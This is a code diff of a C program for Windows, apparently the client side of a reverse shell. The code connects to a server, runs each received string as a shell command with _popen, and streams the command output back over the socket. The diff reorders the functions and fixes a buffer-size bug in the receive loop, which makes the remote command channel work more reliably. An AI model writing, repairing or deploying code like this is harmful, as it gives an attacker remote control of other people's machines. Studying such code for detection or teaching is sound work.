@@ -38,22 +38,31 @@ SOCKET connect_to_server() {
   
 }
 
-int process_incoming_byte_stream(SOCKET sock, char *recv_buffer, size_t *recv_len) {
+int process_cmd(char *cmd, SOCKET sock) {
 
-  int n = recv(sock, recv_buffer + *recv_len, sizeof(recv_buffer) - *recv_len, 0);
+  FILE *fp = _popen(cmd, "r");
 
-  if (n > 0) {
+  char output[1024];
+  int n_bytes;
+  while ((n_bytes = fread(output, 1, sizeof(output), fp)) > 0) {
 
-    *recv_len += n;
-    if (process_buffered_data(recv_len, recv_buffer, sock) < 0) {
-      return -1;
+    size_t sent = 0;
+    while (sent < n_bytes) {
+      int n = send(sock, output + sent, n_bytes - sent, 0);
+
+      if (n > 0) {
+        sent += n;
+      } else {
+        return -1;
+      }
     }
 
-  } else {
-      return -1;
   }
 
+  _pclose(fp);
+
   return 0;
+
 }
 
 int process_buffered_data(size_t *recv_len, char *recv_buffer, SOCKET sock) {
@@ -83,31 +92,22 @@ int process_buffered_data(size_t *recv_len, char *recv_buffer, SOCKET sock) {
 
 }
 
-int process_cmd(char *cmd, SOCKET sock) {
+int process_incoming_byte_stream(SOCKET sock, char *recv_buffer, size_t buffer_capacity, size_t *recv_len) {
 
-  FILE *fp = _popen(cmd, "r");
+  int n = recv(sock, recv_buffer + *recv_len, buffer_capacity - *recv_len, 0);
 
-  char output[1024];
-  int n_bytes;
-  while ((n_bytes = fread(output, 1, sizeof(output), fp)) > 0) {
+  if (n > 0) {
 
-    size_t sent = 0;
-    while (sent < n_bytes) {
-      int n = send(sock, output + sent, n_bytes - sent, 0);
-
-      if (n > 0) {
-        sent += n;
-      } else {
-        return -1;
-      }
+    *recv_len += n;
+    if (process_buffered_data(recv_len, recv_buffer, sock) < 0) {
+      return -1;
     }
 
+  } else {
+      return -1;
   }
 
-  _pclose(fp);
-
   return 0;
-
 }
 
 int main() {
@@ -140,10 +140,11 @@ int main() {
     int connection_alive = 1;
 
     char recv_buffer[1024];
+    size_t buffer_capacity = sizeof(recv_buffer);
     size_t recv_len = 0;
     while (connection_alive) {
 
-      if (process_incoming_byte_stream(sock, recv_buffer, &recv_len) < 0) {
+      if (process_incoming_byte_stream(sock, recv_buffer, buffer_capacity, &recv_len) < 0) {
         closesocket(sock);
         connection_alive = 0;
       }
